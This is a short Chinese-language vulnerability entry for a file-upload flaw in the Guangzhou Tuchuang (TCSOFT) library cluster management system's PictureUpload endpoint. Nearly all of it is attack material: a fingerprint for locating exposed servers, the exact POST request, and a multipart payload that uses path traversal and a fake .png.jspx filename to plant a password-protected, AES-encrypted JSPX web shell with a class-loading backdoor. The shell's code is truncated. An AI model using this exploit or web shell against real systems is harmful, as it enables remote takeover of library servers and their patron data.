# 广州图创图书馆集群管理系统PictureUpload存在文件上传致漏洞

- **系统**：广州图创图书馆集群管理系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="TCSOFT-图书馆集群管理系统"`
- **请求**：`POST /interlib/loan/PictureUpload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="/../1"; filename="1.png.jspx"
Content-Type: image/png
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration> String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));re…（脚本共 2941 字，完整版见原文）
```
- **预期**：200　|　—